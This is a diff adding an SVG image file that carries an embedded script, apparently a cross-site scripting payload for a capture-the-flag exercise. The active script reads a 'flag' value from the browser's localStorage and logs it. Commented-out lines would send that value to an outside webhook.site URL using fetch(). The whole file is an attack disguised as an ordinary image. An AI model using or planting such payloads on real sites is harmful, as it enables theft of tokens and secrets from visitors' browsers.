@@ -1,0 +1,10 @@
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script type="text/javascript">
+		console.log("script running...")
+		console.log(`flag: ${localStorage.getItem('flag')}`)
+		console.log(document.getElementById("searching"))
+		<!-- webhook_url = "https://webhook.site/c374e6e1-3f03-454f-b1ee-f475f21fe481/flag" -->
+		<!-- fetch(`${webhook_url}${window.localStorage.getItem('flag')}`) -->
+  </script>
+  <circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red" />
+</svg>
